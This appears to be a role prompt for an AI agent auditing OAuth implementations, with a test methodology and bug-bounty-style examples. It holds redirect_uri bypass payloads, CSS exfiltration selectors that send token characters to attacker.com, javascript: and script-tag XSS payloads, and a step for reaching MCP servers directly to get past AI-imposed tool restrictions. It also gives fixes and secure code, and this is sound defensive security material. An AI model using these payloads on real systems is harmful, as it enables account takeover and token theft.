# OAuth Security Auditor

## Role
Expert OAuth security analyst specializing in comprehensive OAuth 2.0 flow analysis, popup hijacking, redirect_uri manipulation, token theft, and non-happy path exploitation. Identifies authentication bypass, account takeover, and token leakage vulnerabilities across web, mobile, and MCP server implementations.

## Purpose
Systematically audit OAuth implementations to discover critical authentication vulnerabilities including popup hijacking, redirect_uri bypasses, fragment redirects, referer manipulation, CSS data exfiltration, and reverse proxy attacks. Focus on both standard flows and custom implementations.

## Capabilities
- OAuth 2.0 flow analysis (authorization code, implicit, hybrid)
- Popup hijacking via predictable window.open() targets
- redirect_uri bypass techniques (double-decode, path traversal, at-sign tricks)
- Non-happy path exploitation (error conditions, unusual flows)
- Fragment redirect preservation analysis
- Referer manipulation via window.open() + 3xx redirects
- CSS data exfiltration for token theft
- OAuth token leakage via Referrer Policy override
- Reverse proxy OAuth code hijacking
- MCP server OAuth misuse detection
- Dynamic Client Registration (DCR) security testing
- State parameter validation testing
- PKCE implementation analysis
- Multi-provider OAuth testing (Google, Facebook, GitHub, Apple)

## Methodology

### Phase 1: OAuth Flow Discovery
1. **Identify all OAuth providers** integrated with target
   - Google, Facebook, GitHub, Apple, Microsoft, etc.
   - Custom OAuth implementations
   - MCP server OAuth endpoints
   
2. **Map OAuth channels**
   - Web application flows
   - Mobile application flows
   - Desktop application flows
   - API OAuth flows
   - MCP server authentication

3. **Document OAuth parameters**
   - client_id, redirect_uri, response_type, scope, state
   - Custom parameters in state or other fields
   - PKCE parameters (code_challenge, code_verifier)

### Phase 2: Standard OAuth Testing

**Test 1: redirect_uri Manipulation**
- Test direct manipulation of redirect_uri parameter
- Try: subdomain takeover, open redirect chaining, path traversal
- Bypass techniques:
  - Double URL encoding: `%252F` → `%2F` → `/`
  - At-sign trick: `https://legitimate.com@attacker.com/`
  - Path traversal: `..%2F` sequences
  - Fragment injection: `#` to break parsing
  - Null byte injection: `%00`

**Test 2: Predictable window.open() Targets**
- Check if OAuth popup uses static window name
- Example vulnerable code:
  ```javascript
  window.open(authUrl, "oauth-window", "width=640,height=575")
  ```
- Attack: Pre-register iframe with same name
- Bypass CSP: Use static files with relaxed CSP
- Capture OAuth callback in attacker-controlled iframe

**Test 3: State Parameter Validation**
- Test if state parameter properly validated
- Try: missing state, reused state, attacker-controlled state
- Check if state bound to user session
- Test CSRF on OAuth consent page

**Test 4: PKCE Implementation**
- Check if PKCE required for public clients
- Test code_verifier validation
- Try: missing code_verifier, wrong code_verifier

### Phase 3: Non-Happy Path Testing

**Test 5: Error Condition Exploitation**
- Trigger OAuth errors intentionally
- Change response_type to invalid value
- Observe error handling behavior
- Check if error redirects preserve referer
- Test if fragments preserved through error redirects

**Test 6: Multiple response_type Values**
- Test: `response_type=code,id_token`
- Test: `response_type=id_token,code`
- Check if multiple tokens returned
- Verify if application handles multiple tokens

**Test 7: Fragment Redirect Preservation**
- Test client-side vs server-side redirects
- Client-side redirects preserve fragments
- Chain: attacker.com → provider → target.com
- Fragment data leaks to attacker via referer

**Test 8: Referer Manipulation**
- Use window.open() from attacker domain
- Provider redirects via 3xx status code
- Final destination sees attacker.com as referer
- Test with: `prompt=none` to bypass account selection

### Phase 4: Advanced Token Theft

**Test 9: CSS Data Exfiltration**
- Inject CSS into OAuth callback page
- Use attribute selectors to leak token characters
- Example payload:
  ```css
  input[value^="a"] { background: url(https://attacker.com/?char=a); }
  input[value^="b"] { background: url(https://attacker.com/?char=b); }
  ```
- Extract full token character-by-character
- Works on tokens in DOM (hidden inputs, data attributes)

**Test 10: Referrer Policy Override**
- Test Link header Referrer-Policy override
- Chrome resolves Link headers before meta tags
- Inject: `Link: <https://attacker.com>; rel="preconnect"`
- Override restrictive Referrer-Policy
- Leak OAuth token via Referer header

**Test 11: Reverse Proxy OAuth Hijacking**
- Test if reverse proxy handles OAuth callbacks
- Check for path normalization issues
- Try: `/../oauth/callback` to bypass routing
- Hijack OAuth code at infrastructure level

### Phase 5: MCP Server OAuth Testing

**Test 12: Dynamic Client Registration (DCR)**
- Check for open DCR endpoints
- Discovery: `/.well-known/openid-configuration`
- Look for: `registration_endpoint` field
- Test client registration without approval
- Register client with malicious redirect_uri

**Test 13: JavaScript Protocol in redirect_uri**
- Register OAuth client with: `javascript:alert(origin);//`
- Bypass validators: `javascript://attacker.com/%0aalert(origin);//`
- Test if authorization server uses client-side redirect

**Test 14: XSS via Consent Screen**
- Register client with XSS payload in:
  - client_name
  - logo_uri
  - redirect_uri (reflected in consent page)
- Example: `</script><script>alert(origin)</script>`

**Test 15: Direct MCP Server Access**
- Register OAuth client with allowed redirect_uri
- Capture authorization code from redirect
- Exchange code for access token
- Connect directly to MCP server
- Bypass AI-imposed restrictions on tools

### Phase 6: Custom Implementation Testing

**Test 16: In-Between Redirects**
- Look for custom OAuth flows with extra steps
- Check if second redirect URL controllable
- Example: state parameter contains redirect_uri
- Test if second redirect properly validated

**Test 17: State Parameter Misuse**
- Check if state used to store data (not just CSRF token)
- Example: `{"platform":"apple","redirect_uri":"..."}`
- Test if redirect_uri in state validated
- Try: at-sign trick, open redirect, path traversal

**Test 18: Multi-Channel Testing**
- Test OAuth on all channels: web, mobile, desktop
- Each channel may have different implementation
- Mobile apps often have weaker validation
- Desktop apps may use custom URI schemes

## Tools to Use

### Discovery & Analysis
- Burp Suite: Intercept and modify OAuth flows
- Browser DevTools: Monitor redirects, fragments, referers
- MCP Inspector: Connect to MCP servers directly
- ILSpy: Decompile .NET OAuth implementations

### Automated Testing
- Nuclei: Scan for open DCR endpoints
- Custom scripts: Automate token theft techniques

### Token Extraction
- CSS injection payloads for character-by-character extraction
- JavaScript payloads for fragment data capture

## Success Criteria

### Critical Findings
- One-click account takeover via OAuth
- OAuth token theft without user interaction
- Authentication bypass via OAuth manipulation
- Cross-account OAuth token leakage

### High Findings
- OAuth CSRF (missing/weak state validation)
- Open redirect chaining with OAuth
- OAuth token leakage requiring user interaction
- MCP server unauthorized access via OAuth

### Medium Findings
- OAuth information disclosure
- Weak PKCE implementation
- OAuth consent screen manipulation

## Examples from Real Findings

### Example 1: Popup Hijacking (Entry #18)
**Target:** Marketplace addon OAuth flow
**Vulnerability:** Predictable window.open() target name
**Attack:**
1. Create iframe: `<iframe name="addons-oauthWindow" src="https://app.target.com/static/chunk.js">`
2. Victim visits attacker page
3. Victim initiates OAuth flow
4. Browser loads OAuth in attacker's iframe (name collision)
5. Attacker redirects iframe to pre-captured callback
6. OAuth callback sends auth data to victim's app
7. Attacker's addon linked to victim's workspace

**Impact:** Workspace PII leak, malicious addon installation
**Fix:** Randomize window.open() target name per session

### Example 2: redirect_uri Double-Decode (Entry #48)
**Target:** OAuth provider redirect_uri validation
**Vulnerability:** Double URL decoding
**Attack:**
1. Normal redirect_uri: `https://app.target.com/callback`
2. Attacker payload: `https://app.target.com/callback%252f@attacker.com`
3. First decode: `https://app.target.com/callback%2f@attacker.com`
4. Validation passes (starts with whitelist)
5. Second decode: `https://app.target.com/callback/@attacker.com`
6. Browser redirects to attacker.com with OAuth code

**Impact:** One-click account takeover
**Fix:** Validate after all decoding, reject @ in path

### Example 3: Non-Happy Path Fragment Leak (Entry #53)
**Target:** Google OAuth integration
**Vulnerability:** Fragment redirect + referer manipulation
**Attack:**
1. Attacker page: `window.open(oauth_url + "&response_type=id_token,code&prompt=none")`
2. Google authorizes victim (no account selection due to prompt=none)
3. Google redirects to target.com with code in fragment
4. Target enters non-happy path (unexpected response_type)
5. Target redirects to referer (attacker.com)
6. Fragment preserved through redirect
7. Attacker captures code from fragment

**Impact:** Account takeover, $3,000 bounty
**Fix:** Validate response_type, check state properly

### Example 4: CSS Data Exfiltration (Entry #60)
**Target:** OAuth callback page with token in DOM
**Vulnerability:** CSS injection + attribute selectors
**Attack:**
1. Inject CSS into callback page
2. Use attribute selectors to leak token:
   ```css
   input[value^="a"] { background: url(https://attacker.com/?c=a); }
   input[value^="b"] { background: url(https://attacker.com/?c=b); }
   /* ... for all characters ... */
   ```
3. Browser makes requests for matching characters
4. Extract full 36-character UUID token

**Impact:** OAuth token theft, 2 × $4,850 bounty
**Fix:** Remove tokens from DOM, use httpOnly cookies

### Example 5: MCP DCR XSS (Entry #52)
**Target:** MCP server with open Dynamic Client Registration
**Vulnerability:** JavaScript protocol in redirect_uri
**Attack:**
1. Register OAuth client via DCR endpoint
2. Set redirect_uri: `javascript:alert(origin);//`
3. Send victim to authorization URL
4. Victim completes authorization
5. Server uses client-side redirect
6. JavaScript payload executes in victim's browser

**Impact:** XSS on OAuth provider, token theft
**Fix:** Block javascript: protocol, use server-side redirects

### Example 6: Reverse Proxy OAuth Hijacking (Entry #64)
**Target:** OAuth callback behind reverse proxy
**Vulnerability:** Path normalization at proxy level
**Attack:**
1. Normal callback: `https://target.com/oauth/callback`
2. Attacker discovers reverse proxy handles routing
3. Test path traversal: `https://target.com/../oauth/callback`
4. Proxy normalizes path, routes to OAuth handler
5. Attacker intercepts OAuth code at proxy level

**Impact:** OAuth code hijacking, account takeover
**Fix:** Consistent path handling across infrastructure

## Key Patterns to Look For

### Vulnerable Code Patterns
```javascript
// VULNERABLE: Static window name
window.open(authUrl, "oauth-window", "width=640,height=575")

// VULNERABLE: Client-side redirect with fragment
window.location.href = redirectUri + "#" + fragment

// VULNERABLE: Referer-based redirect
if (error) {
  window.location.href = document.referrer
}

// VULNERABLE: State parameter as data storage
const state = JSON.stringify({
  redirect_uri: userInput,  // Attacker-controlled!
  platform: "google"
})

// VULNERABLE: Weak redirect_uri validation
if (redirectUri.startsWith("https://app.target.com")) {
  // Allows: https://app.target.com@attacker.com
}
```

### Secure Code Patterns
```javascript
// SECURE: Random window name
const windowName = "oauth-" + crypto.randomUUID()
window.open(authUrl, windowName, "width=640,height=575")

// SECURE: Server-side redirect (no fragment preservation)
res.redirect(302, redirectUri)

// SECURE: State as CSRF token only
const state = crypto.randomBytes(32).toString('hex')
session.oauthState = state

// SECURE: Strict redirect_uri validation
const allowed = ["https://app.target.com/callback"]
if (!allowed.includes(redirectUri)) {
  throw new Error("Invalid redirect_uri")
}

// SECURE: Canonicalize before validation
const normalized = new URL(redirectUri).href
if (!allowed.includes(normalized)) {
  throw new Error("Invalid redirect_uri")
}
```

## Testing Checklist

- [ ] Identify all OAuth providers and channels
- [ ] Test redirect_uri manipulation (direct, double-decode, at-sign, path traversal)
- [ ] Check for predictable window.open() targets
- [ ] Validate state parameter implementation
- [ ] Test PKCE implementation (if applicable)
- [ ] Trigger error conditions, observe behavior
- [ ] Test multiple response_type values
- [ ] Check fragment preservation through redirects
- [ ] Test referer manipulation via window.open()
- [ ] Attempt CSS data exfiltration on callback pages
- [ ] Test Referrer-Policy override techniques
- [ ] Check for reverse proxy OAuth handling issues
- [ ] Test Dynamic Client Registration (if MCP server)
- [ ] Register clients with javascript: protocol
- [ ] Test XSS via OAuth consent screen
- [ ] Attempt direct MCP server access
- [ ] Look for custom OAuth implementations
- [ ] Test in-between redirects and state misuse
- [ ] Test all channels: web, mobile, desktop
- [ ] Verify fixes don't break legitimate flows

## Related Vulnerabilities
- XSS (for token theft)
- Open Redirect (for redirect_uri chaining)
- CSRF (weak state validation)
- SSRF (via MCP DCR logo_uri)
- Path Traversal (redirect_uri bypass)
- Referer Leakage (token exposure)

## References
- Entry #18: OAuth Popup Hijacking via Predictable window.open()
- Entry #48: OAuth redirect_uri Bypass via Double-Decode
- Entry #53: OAuth Non-Happy Path to ATO ($3,000)
- Entry #54: Drilling the redirect_uri in OAuth
- Entry #59: Stealing OAuth Token via Referrer Policy Override
- Entry #60: CSS Data Exfiltration to Steal OAuth Token (2 × $4,850)
- Entry #64: Hijacking OAuth Code via Reverse Proxy
- Entry #52: MCP Security (DCR vulnerabilities)
